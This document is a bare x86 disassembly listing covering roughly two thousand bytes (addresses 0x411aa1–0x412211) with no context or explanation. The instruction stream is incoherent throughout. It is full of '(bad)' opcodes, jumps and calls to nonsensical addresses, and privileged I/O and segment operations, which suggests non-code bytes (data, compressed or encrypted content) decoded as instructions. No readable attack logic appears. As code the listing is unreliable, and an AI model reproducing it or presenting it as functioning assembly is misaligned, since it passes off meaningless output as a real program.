  411aa1:	hlt    
  411aa2:	xchg   edi,eax
  411aa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aa4:	sbb    DWORD PTR [ecx],eax
  411aa6:	popf   
  411aa7:	stos   BYTE PTR es:[edi],al
  411aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aa9:	lds    edi,FWORD PTR [edi]
  411aab:	ins    BYTE PTR es:[edi],dx
  411aac:	pop    esi
  411aad:	(bad)  
  411aae:	xchg   BYTE PTR [ebx+0x4e],dl
  411ab1:	jp     0x411afd
  411ab3:	rcl    edi,cl
  411ab5:	shl    BYTE PTR [ecx],0xa9
  411ab8:	push   cs
  411ab9:	les    eax,FWORD PTR [ebp+0xf2aebe3]
  411abf:	push   ebp
  411ac0:	and    edi,DWORD PTR [edx-0x7b]
  411ac3:	sbb    BYTE PTR [edx],al
  411ac5:	xor    BYTE PTR [ecx-0x3399b147],dh
  411acb:	loope  0x411b18
  411acd:	push   eax
  411ace:	dec    ebp
  411acf:	push   edx
  411ad0:	push   es
  411ad1:	fstp   DWORD PTR [esi]
  411ad3:	scas   eax,DWORD PTR es:[edi]
  411ad4:	inc    esp
  411ad5:	cdq    
  411ad6:	(bad)  
  411ad7:	lock xchg esp,eax
  411ad9:	adc    bl,al
  411adb:	sbb    DWORD PTR [eax-0x50],0x16
  411adf:	neg    BYTE PTR [ebx-0x71]
  411ae2:	inc    esi
  411ae3:	call   0x2169:0xb667875
  411aea:	jmp    0x6130e11a
  411aef:	fnstenv [ebx]
  411af1:	stos   DWORD PTR es:[edi],eax
  411af2:	inc    ebx
  411af3:	outs   dx,BYTE PTR ds:[esi]
  411af4:	dec    edi
  411af5:	push   ebx
  411af6:	stos   BYTE PTR es:[edi],al
  411af7:	pusha  
  411af8:	add    DWORD PTR [ecx+eiz*8-0x6c],esp
  411afc:	int    0xe7
  411afe:	lock lods eax,DWORD PTR ds:[esi]
  411b00:	mov    ch,0xdd
  411b02:	in     al,0x44
  411b04:	in     al,0x7b
  411b06:	pop    es
  411b07:	out    0x67,al
  411b09:	mov    ah,0x63
  411b0b:	lods   al,BYTE PTR ds:[esi]
  411b0c:	and    DWORD PTR [edx-0x7a94e3d7],edx
  411b12:	stc    
  411b13:	cli    
  411b14:	jbe    0x411aae
  411b16:	push   esi
  411b17:	mov    esp,0x1eb1b70
  411b1c:	pop    eax
  411b1d:	sub    al,0xe2
  411b1f:	fild   DWORD PTR [ebx-0x2eebc0a5]
  411b25:	(bad)  [ebx]
  411b27:	mov    dh,0xd6
  411b29:	xor    esi,DWORD PTR [edi+edi*4-0x3a]
  411b2d:	xchg   ecx,eax
  411b2e:	add    DWORD PTR [eax+0x6d1b0222],ebp
  411b34:	test   DWORD PTR [edi+0x41fcec4b],ebx
  411b3a:	xor    cl,BYTE PTR [eax+eax*1]
  411b3d:	or     al,bl
  411b3f:	xor    eax,0xc7051211
  411b44:	mul    esi
  411b46:	frstor [esi+0x0]
  411b49:	imul   edx,DWORD PTR [ecx+esi*8+0x3a5ed8aa],0xffffff9d
  411b51:	sbb    eax,0xa06e5728
  411b56:	jb     0x411b55
  411b58:	in     eax,dx
  411b59:	cmp    ecx,eax
  411b5b:	xchg   ebx,eax
  411b5c:	test   al,0x20
  411b5e:	psubsw mm4,QWORD PTR [ecx+0x3a]
  411b62:	cmp    cl,BYTE PTR [ecx+0x1a8521dd]
  411b68:	pushf  
  411b69:	inc    ebx
  411b6a:	add    ch,al
  411b6c:	ins    DWORD PTR es:[edi],dx
  411b6d:	inc    esi
  411b6e:	mov    ah,0x58
  411b70:	mov    esi,edx
  411b72:	xchg   edi,eax
  411b73:	cmp    eax,ebx
  411b75:	mov    dh,0xf
  411b77:	sub    BYTE PTR [eax+0x3a],dh
  411b7a:	mov    eax,0xce098dd8
  411b7f:	je     0x411b10
  411b81:	pop    ebx
  411b82:	retf   
  411b83:	stos   DWORD PTR es:[edi],eax
  411b84:	push   ds
  411b85:	(bad)  
  411b86:	daa    
  411b87:	pop    edx
  411b88:	push   cs
  411b89:	cli    
  411b8a:	push   esi
  411b8b:	push   ds
  411b8c:	fs clc 
  411b8e:	adc    al,0x1b
  411b90:	fcmovnb st,st(7)
  411b92:	or     DWORD PTR [ebx],edi
  411b94:	mov    ebx,0xf7625bd
  411b99:	dec    esp
  411b9a:	or     BYTE PTR ds:0xb7166a7,dh
  411ba0:	lock paddw mm7,mm2
  411ba4:	push   es
  411ba5:	stos   DWORD PTR es:[edi],eax
  411ba6:	mov    ah,0xb4
  411ba8:	inc    ebp
  411ba9:	jecxz  0x411b31
  411bab:	adc    ah,BYTE PTR [ebx-0x58]
  411bae:	(bad)  
  411bb0:	push   ebp
  411bb1:	dec    edx
  411bb2:	into   
  411bb3:	jle    0x411b4a
  411bb5:	fld    TBYTE PTR [edi+0x50]
  411bb8:	loop   0x411b41
  411bba:	icebp  
  411bbb:	ror    BYTE PTR [edx-0x616fbb7],cl
  411bc1:	mov    BYTE PTR [ebx+0x2f657f0a],ah
  411bc7:	pushf  
  411bc8:	adc    BYTE PTR [edi],al
  411bca:	xchg   BYTE PTR [edi+0x3c],bh
  411bcd:	sub    al,0x5a
  411bcf:	rcr    ch,cl
  411bd1:	fsubr  QWORD PTR [esi]
  411bd3:	out    dx,eax
  411bd4:	fstp   DWORD PTR [ebx+esi*8-0x7f]
  411bd8:	fwait
  411bd9:	stos   DWORD PTR es:[edi],eax
  411bda:	pushf  
  411bdb:	mov    ah,0x67
  411bdd:	push   ds
  411bde:	lahf   
  411bdf:	das    
  411be0:	les    ebp,FWORD PTR [esi+ecx*4+0x7d]
  411be4:	(bad)  
  411be5:	xchg   edi,eax
  411be6:	add    BYTE PTR [edi],al
  411be8:	xchg   ecx,eax
  411be9:	ins    DWORD PTR es:[edi],dx
  411bea:	mov    ds:0x41a2cf26,eax
  411bef:	jo     0x411bba
  411bf1:	dec    edi
  411bf2:	(bad)  
  411bf3:	retf   
  411bf4:	psadbw mm2,QWORD PTR [eax*8-0x1c34c407]
  411bfc:	test   al,0x10
  411bfe:	mov    esp,0xe878d8c7
  411c03:	mov    cl,0x4a
  411c05:	add    BYTE PTR [ebp+0x184a5b5],bl
  411c0b:	aad    0x8a
  411c0d:	push   es
  411c0e:	xchg   edi,eax
  411c0f:	(bad)  
  411c10:	inc    ecx
  411c11:	cmp    eax,0x7e0e95fa
  411c16:	div    DWORD PTR [esi+0x6f]
  411c19:	mov    bh,al
  411c1b:	sti    
  411c1c:	lea    ecx,[eax+edx*4]
  411c1f:	rcl    BYTE PTR [edx],1
  411c21:	xchg   edi,eax
  411c22:	or     bl,dl
  411c24:	and    eax,0x266756c2
  411c29:	xchg   esp,eax
  411c2a:	adc    eax,0x376bbe8b
  411c2f:	inc    esp
  411c30:	(bad)  
  411c32:	enter  0xeee3,0xe3
  411c36:	aas    
  411c37:	into   
  411c38:	sbb    DWORD PTR [ebp+0x119200d2],edx
  411c3e:	push   ebx
  411c3f:	imul   esp,DWORD PTR [ebp+0x17405744],0x3856eafb
  411c49:	cwde   
  411c4a:	xlat   BYTE PTR cs:[ebx]
  411c4c:	mov    ecx,0xf9211503
  411c51:	shr    BYTE PTR [eax],cl
  411c53:	cmp    al,0x78
  411c55:	mov    ah,0x94
  411c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c58:	mov    edx,0x42046246
  411c5d:	shl    DWORD PTR [eax],cl
  411c5f:	jecxz  0x411c2a
  411c61:	fdivp  st(3),st
  411c63:	in     al,0x8a
  411c65:	inc    esi
  411c66:	das    
  411c67:	popa   
  411c68:	ret    
  411c69:	sbb    cl,dh
  411c6b:	cdq    
  411c6c:	mov    dh,0xfb
  411c6e:	and    DWORD PTR [esi],edi
  411c70:	dec    esp
  411c71:	mov    ch,0x6f
  411c73:	jecxz  0x411c5a
  411c75:	pusha  
  411c76:	pop    ds
  411c77:	push   eax
  411c78:	inc    eax
  411c79:	sub    BYTE PTR [eax],ch
  411c7b:	inc    ebx
  411c7c:	pop    esi
  411c7d:	mov    bh,bl
  411c7f:	(bad)  
  411c80:	push   esp
  411c81:	ins    DWORD PTR es:[edi],dx
  411c82:	pop    esi
  411c83:	jns    0x411ceb
  411c85:	inc    edx
  411c86:	and    BYTE PTR [ebx-0x5fde7052],dh
  411c8c:	push   0xffffff80
  411c8e:	xchg   esi,esp
  411c90:	fcom   DWORD PTR [edx-0x3b]
  411c93:	jmp    0x595773f6
  411c98:	sub    bl,BYTE PTR [ecx-0x638e68da]
  411c9e:	loope  0x411c59
  411ca0:	dec    edx
  411ca1:	mov    bl,0xe6
  411ca3:	push   ebp
  411ca4:	inc    ebx
  411ca5:	xor    eax,0xbe19e61d
  411caa:	jo     0x411d28
  411cac:	sbb    BYTE PTR [ebx-0x16930923],bh
  411cb2:	xchg   esp,eax
  411cb3:	push   0x2b3ebe1
  411cb8:	push   edi
  411cb9:	pop    ss
  411cba:	cmp    cl,BYTE PTR [edi]
  411cbc:	shl    DWORD PTR [edx],0x72
  411cbf:	push   esi
  411cc0:	cmp    cl,BYTE PTR [edx+0x30832fdc]
  411cc6:	pop    ds
  411cc7:	pusha  
  411cc8:	add    eax,0x852b2ea7
  411ccd:	aam    0xa6
  411ccf:	push   0xc7ff9677
  411cd4:	and    bh,BYTE PTR [ebp-0x44cb3542]
  411cda:	mov    esp,ebp
  411cdc:	and    dl,al
  411cde:	inc    edi
  411cdf:	xor    DWORD PTR [edx+0x61e20d1f],ebx
  411ce5:	fadd   QWORD PTR [eax]
  411ce7:	and    bh,BYTE PTR [ebx]
  411ce9:	xchg   DWORD PTR [ebx-0x10eb6b11],edx
  411cef:	inc    edx
  411cf0:	mov    esp,0xbd2588da
  411cf5:	pop    ebp
  411cf6:	xchg   ebx,eax
  411cf7:	in     al,0xb4
  411cf9:	in     al,dx
  411cfa:	jno    0x411d0d
  411cfc:	push   ecx
  411cfd:	fimul  DWORD PTR [ecx+0x30]
  411d00:	aaa    
  411d01:	cmp    eax,esp
  411d03:	mov    WORD PTR [edi+0x79802436],ds
  411d09:	repz sbb eax,0xf6d6a1d6
  411d0f:	lock jbe 0x411d02
  411d12:	xlat   BYTE PTR ds:[ebx]
  411d13:	call   0x935e86c5
  411d18:	xchg   DWORD PTR [ebp-0x59542d3e],edi
  411d1e:	inc    ebp
  411d1f:	fwait
  411d20:	mov    al,0x1d
  411d22:	stc    
  411d23:	fisub  WORD PTR ds:0x6375
  411d28:	sbb    eax,0xed96e863
  411d2d:	cdq    
  411d2e:	stos   DWORD PTR es:[edi],eax
  411d2f:	or     DWORD PTR [ebx],ebp
  411d31:	lahf   
  411d32:	sub    eax,0x1a5ff8d8
  411d37:	inc    eax
  411d38:	pop    esi
  411d39:	pusha  
  411d3a:	sbb    BYTE PTR [eax],dh
  411d3c:	xchg   BYTE PTR [edx+ebp*2-0xe],dl
  411d40:	fbstp  TBYTE PTR [ebx+0x751c3e72]
  411d46:	shl    DWORD PTR [eax],cl
  411d48:	jmp    0x4390e3dc
  411d4d:	jp     0x411d01
  411d4f:	sahf   
  411d50:	outs   dx,BYTE PTR ds:[esi]
  411d51:	or     DWORD PTR [ecx],0xffffffb4
  411d54:	or     dh,BYTE PTR ds:0x5023ef1d
  411d5a:	sub    al,dh
  411d5c:	(bad)  
  411d5d:	nop
  411d5e:	xchg   ebx,eax
  411d5f:	pop    eax
  411d60:	sbb    bh,bl
  411d62:	je     0x411d23
  411d64:	call   DWORD PTR [ebp+0x4aa904c6]
  411d6a:	aad    0x10
  411d6c:	out    dx,eax
  411d6d:	cmp    bh,dh
  411d6f:	pop    eax
  411d70:	mov    dh,0xbe
  411d72:	push   0x65
  411d74:	jp     0x411d8b
  411d76:	push   ebp
  411d77:	pop    es
  411d78:	jnp    0x411d8a
  411d7a:	sbb    eax,0x50a39624
  411d7f:	aam    0x6
  411d81:	ret    0x66bb
  411d84:	adc    eax,0x9ea444e
  411d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d8a:	inc    esp
  411d8b:	ds int3 
  411d8d:	mov    ebp,0x654f075a
  411d92:	scas   eax,DWORD PTR es:[edi]
  411d93:	mov    WORD PTR [esi],?
  411d95:	out    0xe,al
  411d97:	test   eax,0xdd6130a2
  411d9c:	mov    edi,0x21364958
  411da1:	cmovp  edi,DWORD PTR [esp+ecx*4+0x12]
  411da6:	pop    DWORD PTR [ecx-0x656a33c6]
  411dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dad:	adc    al,0xf5
  411daf:	or     ebp,ebp
  411db1:	xbegin 0x8bb7457f
  411db7:	loopne 0x411ded
  411db9:	jns    0x411db3
  411dbb:	mov    ecx,0x5a2a56ed
  411dc0:	or     BYTE PTR [edx-0xdb5dfc5],ah
  411dc6:	add    BYTE PTR [ebx-0x69],ch
  411dc9:	loop   0x411e33
  411dcb:	pop    esi
  411dcc:	jecxz  0x411d82
  411dce:	sub    bh,BYTE PTR [ebx]
  411dd0:	jmp    ebp
  411dd2:	loop   0x411d81
  411dd4:	jnp    0x411e46
  411dd6:	mov    edx,0x72cb343c
  411ddb:	pop    ecx
  411ddc:	jns    0x411d65
  411dde:	jg     0x411db1
  411de0:	mov    edx,0x797d7709
  411de5:	push   cs
  411de6:	cld    
  411de7:	lea    edi,[ecx+0x4a]
  411dea:	and    al,0x18
  411dec:	out    dx,eax
  411ded:	repz js 0x411d93
  411df0:	leave  
  411df1:	aaa    
  411df2:	outs   dx,DWORD PTR ds:[esi]
  411df3:	jge    0x411e0b
  411df5:	pop    eax
  411df6:	repz xchg edx,eax
  411df8:	sar    ebx,1
  411dfa:	ins    BYTE PTR es:[edi],dx
  411dfb:	cmp    BYTE PTR [esi],cl
  411dfd:	and    eax,0xacc155c2
  411e02:	xor    BYTE PTR [edi-0xe],cl
  411e05:	addr16 (bad) 
  411e07:	aam    0xd6
  411e09:	(bad)  
  411e0b:	int3   
  411e0c:	lea    ebp,gs:[edx-0x57]
  411e10:	scas   al,BYTE PTR es:[edi]
  411e11:	sbb    DWORD PTR [ebp+0x30],eax
  411e14:	jecxz  0x411e19
  411e16:	jmp    0x35481331
  411e1b:	fs cmp esp,esi
  411e1e:	push   0x9fe015b
  411e23:	mov    ss,eax
  411e25:	or     eax,0x5e9e74b5
  411e2a:	pop    ebx
  411e2c:	and    al,0x13
  411e2e:	push   ebp
  411e2f:	mov    BYTE PTR [ecx+0x6e979a93],0x4a
  411e36:	inc    ecx
  411e37:	mov    ebp,0x238246d4
  411e3c:	mov    dh,0x64
  411e3e:	xchg   esp,eax
  411e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e40:	jns    0x411e9a
  411e42:	push   eax
  411e43:	fstp   DWORD PTR [ebp-0x17cf4797]
  411e49:	adc    eax,0xd3ce1a83
  411e4e:	push   0x68
  411e50:	jecxz  0x411ecb
  411e52:	pop    es
  411e53:	in     al,0xea
  411e55:	cmc    
  411e56:	mov    ch,0xb1
  411e58:	outs   dx,BYTE PTR ds:[esi]
  411e59:	fild   QWORD PTR [ecx+edi*8+0x398535d0]
  411e60:	fild   DWORD PTR [ecx]
  411e62:	adc    dh,cl
  411e64:	(bad)  
  411e65:	js     0x411e4c
  411e67:	push   edi
  411e68:	sbb    cl,BYTE PTR [edx]
  411e6a:	es cwde 
  411e6c:	outs   dx,BYTE PTR ds:[esi]
  411e6d:	mov    ch,0xc7
  411e6f:	mov    al,0xff
  411e71:	int3   
  411e72:	call   0x7c9aea82
  411e77:	jae    0x411e29
  411e79:	(bad)  
  411e7a:	iret   
  411e7b:	jp     0x411e99
  411e7d:	mov    ds:0x9c516ef0,eax
  411e82:	mov    BYTE PTR [eax+0x53dc71ba],dh
  411e88:	adc    dl,BYTE PTR [ecx+0x2a8a5520]
  411e8e:	(bad)  
  411e8f:	sbb    al,0x71
  411e91:	adc    ecx,DWORD PTR [eax-0x31e6bb68]
  411e97:	push   ecx
  411e98:	dec    ecx
  411e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e9a:	push   edi
  411e9b:	add    eax,0x7aa8bd14
  411ea0:	pop    edi
  411ea1:	jnp    0x411ebd
  411ea3:	jo     0x411efc
  411ea5:	and    al,0x71
  411ea7:	stos   DWORD PTR es:[edi],eax
  411ea8:	adc    DWORD PTR [edx-0x3d],eax
  411eab:	or     dl,bl
  411ead:	ret    
  411eae:	shl    ch,1
  411eb0:	outs   dx,DWORD PTR ds:[esi]
  411eb1:	out    0x7c,al
  411eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb4:	sub    ah,BYTE PTR [esi]
  411eb6:	data16 rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eb9:	stos   DWORD PTR es:[edi],eax
  411eba:	sub    esp,edx
  411ebc:	adc    eax,0xc674442f
  411ec1:	outs   dx,BYTE PTR ds:[esi]
  411ec2:	out    0x6a,eax
  411ec4:	jnp    0x411efa
  411ec6:	xchg   DWORD PTR [edx-0x59],ecx
  411ec9:	or     BYTE PTR fs:0xe9eb804f,dl
  411ed0:	imul   ebp,DWORD PTR [ebp-0x5a],0xffffff83
  411ed4:	jge    0x411eef
  411ed6:	(bad)  
  411ed7:	cmc    
  411ed8:	jbe    0x411efa
  411eda:	mov    bh,dh
  411edc:	sbb    dh,bh
  411ede:	lds    eax,FWORD PTR [esi+edx*1]
  411ee1:	xchg   ebp,eax
  411ee2:	pop    es
  411ee3:	inc    ecx
  411ee4:	xchg   ebp,eax
  411ee5:	mov    gs,WORD PTR [esi+0x4e50813e]
  411eeb:	frstor [ecx-0x16f92426]
  411ef1:	xchg   ebx,eax
  411ef2:	add    al,0xad
  411ef4:	push   esi
  411ef5:	pop    ecx
  411ef6:	xchg   edx,eax
  411ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ef8:	pop    ecx
  411ef9:	cld    
  411efa:	add    eax,0x82492563
  411eff:	pop    es
  411f00:	jmp    esi
  411f02:	das    
  411f03:	inc    esi
  411f04:	imul   ebx,esi,0xa06cb117
  411f0a:	mov    edx,0xbf354f60
  411f0f:	aaa    
  411f10:	leave  
  411f11:	xor    eax,0xa860ccb2
  411f16:	xor    eax,eax
  411f18:	xor    cl,dh
  411f1a:	rcl    esp,cl
  411f1c:	or     BYTE PTR [eax-0x270ac24a],al
  411f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f23:	fnstsw WORD PTR [eax]
  411f25:	or     eax,0x64c09394
  411f2a:	addr16 xchg edi,eax
  411f2c:	(bad)  
  411f2d:	(bad)  
  411f2e:	jns    0x411f4e
  411f30:	jg     0x411ee3
  411f32:	cwde   
  411f33:	daa    
  411f34:	popa   
  411f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f36:	dec    ebx
  411f37:	jne    0x411f17
  411f39:	outs   dx,DWORD PTR ds:[esi]
  411f3a:	dec    edi
  411f3b:	push   esp
  411f3c:	lahf   
  411f3d:	add    ah,BYTE PTR ds:0xfba45894
  411f43:	fdiv   QWORD PTR [ecx]
  411f45:	mov    ecx,0xa78be3a3
  411f4a:	out    0xe0,al
  411f4c:	aas    
  411f4d:	not    eax
  411f4f:	jle    0x411fbb
  411f51:	jmp    0x69f9:0xd986aac6
  411f58:	das    
  411f59:	ins    DWORD PTR es:[edi],dx
  411f5a:	cmp    al,0xeb
  411f5c:	sub    eax,0x4e2e3ce9
  411f61:	test   DWORD PTR [eax+ebp*4],esi
  411f64:	outs   dx,DWORD PTR ds:[esi]
  411f65:	iret   
  411f66:	in     eax,0x2a
  411f68:	(bad)  
  411f6a:	mov    BYTE PTR [ebp+0x6a],ch
  411f6d:	jmp    0x411f27
  411f6f:	ja     0x411f91
  411f71:	sbb    al,0x35
  411f73:	jle    0x411f3d
  411f75:	mov    DWORD PTR [ebx-0xded229c],edi
  411f7b:	jbe    0x411fe8
  411f7d:	cmp    BYTE PTR [ecx],cl
  411f7f:	loop   0x411f44
  411f81:	pop    ds
  411f82:	sar    DWORD PTR [eax-0x2ef4ee02],cl
  411f88:	cld    
  411f89:	and    esi,DWORD PTR [ebp+0x794b88f8]
  411f8f:	jmp    0x6f99d399
  411f94:	mov    dl,0xa3
  411f96:	in     al,0xcc
  411f98:	pop    eax
  411f99:	mov    ebx,DWORD PTR [esi]
  411f9b:	(bad)  
  411f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f9d:	inc    eax
  411f9e:	test   BYTE PTR [ebx+ebp*8],dh
  411fa1:	popf   
  411fa2:	push   cs
  411fa3:	in     eax,dx
  411fa4:	hlt    
  411fa5:	pop    esp
  411fa6:	mov    WORD PTR [edi],ds
  411fa8:	fldenv [edi]
  411faa:	mov    dl,0xf8
  411fac:	icebp  
  411fad:	mov    esi,0x73703069
  411fb2:	clc    
  411fb3:	sbb    al,0xad
  411fb5:	(bad)  
  411fb6:	shr    DWORD PTR [ebx-0x6eff209a],cl
  411fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fbd:	in     eax,0xa1
  411fbf:	xchg   esi,eax
  411fc0:	lock xchg cl,bh
  411fc3:	xor    al,0xad
  411fc5:	aam    0x19
  411fc7:	mov    ah,0x6
  411fc9:	fnstenv [edi-0x76de78d]
  411fcf:	fadd   st,st(0)
  411fd1:	xchg   esp,eax
  411fd2:	pop    eax
  411fd3:	xor    DWORD PTR [edx-0x1],esi
  411fd6:	nop
  411fd7:	nop
  411fd8:	xchg   esi,eax
  411fd9:	pop    eax
  411fda:	add    cl,BYTE PTR [edi-0x4d]
  411fdd:	adc    eax,0xd09137c2
  411fe2:	mov    esp,0xbe641283
  411fe7:	aas    
  411fe8:	jecxz  0x411fc9
  411fea:	push   es
  411feb:	fs pop ss
  411fed:	mov    WORD PTR [ecx-0x7a30d6b8],es
  411ff3:	jno    0x412038
  411ff5:	mov    edi,0xdf180819
  411ffa:	mov    esp,0x5cf88b70
  411fff:	inc    ebx
  412000:	xlat   BYTE PTR ds:[ebx]
  412001:	adc    BYTE PTR [eax],al
  412003:	xor    BYTE PTR [esi-0x316d6deb],bl
  412009:	pop    ss
  41200a:	rol    BYTE PTR [esi-0x30],cl
  41200d:	outs   dx,DWORD PTR ds:[esi]
  41200e:	aam    0x21
  412010:	dec    eax
  412011:	iret   
  412012:	mov    edi,0xd071fa9f
  412017:	enter  0x59aa,0x13
  41201b:	mov    ebp,0xa72d7fea
  412020:	clc    
  412021:	mov    al,ds:0xd5417de5
  412026:	pop    ecx
  412027:	fnstcw WORD PTR ds:0xadd14dee
  41202d:	push   cs
  41202e:	cmp    edi,DWORD PTR [ebx+0x2b4a3e43]
  412034:	or     eax,0xe646be66
  412039:	adc    eax,0x362c5f73
  41203e:	enter  0xea66,0x10
  412042:	pop    ebx
  412043:	int    0xf3
  412045:	and    bh,dh
  412047:	mov    dh,0x2d
  412049:	sbb    esp,DWORD PTR [ecx]
  41204b:	push   ebx
  41204c:	mov    esp,0xf2bacd0a
  412051:	out    dx,eax
  412052:	fwait
  412053:	scas   al,BYTE PTR es:[edi]
  412054:	or     esi,DWORD PTR [ecx+ebp*8+0x16]
  412058:	add    eax,0x44ca4652
  41205d:	inc    ebp
  41205e:	mov    ecx,0xedb37099
  412063:	cmp    DWORD PTR ds:0x462d150f,esp
  412069:	lea    esi,[eax-0x37d7ba25]
  41206f:	xor    BYTE PTR [ebp+0xfa98659],bh
  412075:	or     eax,0xd5e30352
  41207a:	repnz and BYTE PTR [ebx],al
  41207d:	jbe    0x41205a
  41207f:	outs   dx,BYTE PTR ds:[esi]
  412080:	jb     0x4120ba
  412082:	daa    
  412083:	mov    bl,BYTE PTR [edi]
  412085:	inc    ecx
  412086:	shl    ch,cl
  412088:	fist   DWORD PTR [eax]
  41208a:	and    al,0x31
  41208c:	xchg   edx,eax
  41208d:	rol    BYTE PTR [ebp+0x553b34e2],1
  412093:	or     eax,0xaa7a7f13
  412098:	lods   al,BYTE PTR ds:[esi]
  412099:	je     0x4120a0
  41209b:	adc    esi,esp
  41209d:	inc    edi
  41209e:	add    dl,ch
  4120a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a1:	mov    esi,DWORD PTR [ecx]
  4120a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a4:	jno    0x4120ac
  4120a6:	bound  eax,QWORD PTR [ebp+0x66eff38c]
  4120ac:	pop    edi
  4120ad:	ror    DWORD PTR [edx-0x49],cl
  4120b0:	imul   ebp,DWORD PTR [ecx-0xf],0x2957d411
  4120b7:	popa   
  4120b8:	cs adc al,0x41
  4120bb:	mov    cl,0xef
  4120bd:	or     BYTE PTR [ebx+edi*1],cl
  4120c0:	sbb    al,0x86
  4120c2:	aas    
  4120c3:	leave  
  4120c4:	out    0xde,eax
  4120c6:	popa   
  4120c7:	into   
  4120c8:	push   edi
  4120c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120ca:	in     eax,dx
  4120cb:	push   eax
  4120cc:	imul   edi,DWORD PTR [edi+0x3c1ad5ed],0xffffffea
  4120d3:	jmp    0xa5e640a1
  4120d8:	(bad)  
  4120d9:	jp     0x412138
  4120db:	cmc    
  4120dc:	scas   eax,DWORD PTR es:[edi]
  4120dd:	sbb    eax,0xa7a13315
  4120e2:	sbb    dl,ah
  4120e4:	add    al,0x6b
  4120e6:	adc    dh,BYTE PTR [edx+0x39]
  4120e9:	or     edi,DWORD PTR [ebx-0x2a17cba2]
  4120ef:	test   DWORD PTR [edx],ebp
  4120f1:	in     al,0x61
  4120f3:	or     ebx,DWORD PTR [ebx]
  4120f5:	add    ecx,DWORD PTR [ebx+ecx*2+0x50]
  4120f9:	sbb    edx,DWORD PTR [eax+0x23]
  4120fc:	icebp  
  4120fd:	jns    0x412124
  4120ff:	retf   0x75ff
  412102:	popf   
  412103:	loop   0x412165
  412105:	div    DWORD PTR [ebp+0x57c420c3]
  41210b:	clc    
  41210c:	pop    ebp
  41210d:	sbb    al,0x5c
  41210f:	fiadd  WORD PTR [edi]
  412111:	fmul   DWORD PTR [esi+eiz*2]
  412114:	inc    edi
  412115:	push   edx
  412116:	arpl   bp,bx
  412118:	aad    0x68
  41211a:	and    eax,0x895ee06f
  41211f:	mov    ss,WORD PTR [edi-0x2d]
  412122:	ror    ecx,cl
  412124:	data16 fcom DWORD PTR [eax-0x1c]
  412128:	fwait
  412129:	sar    esi,1
  41212b:	add    BYTE PTR [ebx+0xbc13917],ah
  412131:	mov    al,0xa1
  412133:	and    BYTE PTR [eax],ch
  412135:	mov    al,0x6a
  412137:	xor    DWORD PTR [edi],edi
  412139:	sahf   
  41213a:	addr16 repnz mov ecx,0x9f86db6a
  412141:	pop    ebp
  412142:	mov    WORD PTR [esi-0x448f5f95],fs
  412148:	loopne 0x41216e
  41214a:	add    al,0x55
  41214c:	aam    0x6b
  41214e:	pop    ebp
  41214f:	sub    ch,BYTE PTR [edi+0x6a]
  412152:	jns    0x412196
  412154:	aam    0x9a
  412156:	xchg   esi,eax
  412157:	mov    dl,0x4
  412159:	xchg   ebx,eax
  41215a:	mov    esp,0x4f59a7bc
  41215f:	mov    edi,DWORD PTR [ecx]
  412161:	iret   
  412162:	push   eax
  412163:	sbb    al,0xef
  412165:	imul   esp,DWORD PTR ds:0xa2c09b85,0xa8768221
  41216f:	popf   
  412170:	mov    ah,0xba
  412172:	jae    0xb3d35291
  412178:	clc    
  412179:	inc    esi
  41217a:	xchg   ebx,eax
  41217b:	jbe    0x4121c1
  41217d:	ret    
  41217e:	mov    dl,0x97
  412180:	imul   DWORD PTR [esi+0x43]
  412183:	push   es
  412184:	fild   WORD PTR [ebx-0x9]
  412187:	dec    esi
  412188:	sub    edx,eax
  41218a:	adc    eax,0x84dd3530
  41218f:	xchg   ecx,eax
  412190:	xor    dl,0x8d
  412193:	shl    BYTE PTR [ebp+0x6a],cl
  412196:	loop   0x412181
  412198:	in     eax,dx
  412199:	(bad)  
  41219a:	push   ecx
  41219b:	aas    
  41219c:	fisttp DWORD PTR [ecx-0x3fcc7f4c]
  4121a2:	in     al,0x94
  4121a4:	imul   eax,ebp,0xc9d5281a
  4121aa:	popa   
  4121ab:	xchg   ecx,eax
  4121ac:	mov    al,0xd1
  4121ae:	sar    bl,1
  4121b0:	fmul   DWORD PTR [ecx+0x522b98de]
  4121b6:	das    
  4121b7:	add    edi,DWORD PTR [eax]
  4121b9:	out    dx,eax
  4121ba:	mov    esp,0x42764e7d
  4121bf:	ins    DWORD PTR es:[edi],dx
  4121c0:	(bad)  
  4121c1:	cwde   
  4121c2:	and    eax,0x84a1bce9
  4121c7:	imul   DWORD PTR ds:0x4dd5281a
  4121cd:	iret   
  4121ce:	pop    ds
  4121cf:	ror    DWORD PTR [ebx+0x9],0xf3
  4121d3:	rol    BYTE PTR [edi+0xcf2c783],1
  4121d9:	lea    esi,[eax+0x5dbebd6a]
  4121df:	sbb    DWORD PTR [edi-0x3b],0xffffffa1
  4121e3:	xchg   DWORD PTR [esi-0x4fc254e8],ecx
  4121e9:	mov    al,BYTE PTR [ebx]
  4121eb:	(bad)  [ecx]
  4121ed:	ins    DWORD PTR es:[edi],dx
  4121ee:	add    esi,edx
  4121f0:	cmp    ecx,DWORD PTR [ebx]
  4121f2:	adc    al,0x33
  4121f4:	daa    
  4121f5:	mov    ah,0x6b
  4121f7:	mov    cs,WORD PTR [edi-0x37]
  4121fa:	lahf   
  4121fb:	mov    ebx,0x7fc8ee24
  412200:	repnz out dx,al
  412202:	mov    bh,0x6e
  412204:	push   ecx
  412205:	jae    0x4121c0
  412207:	push   0xffffffbb
  412209:	and    eax,0xda006b0a
  41220e:	shr    DWORD PTR [eax+0x24],1
  412211:	ss and al,0x32
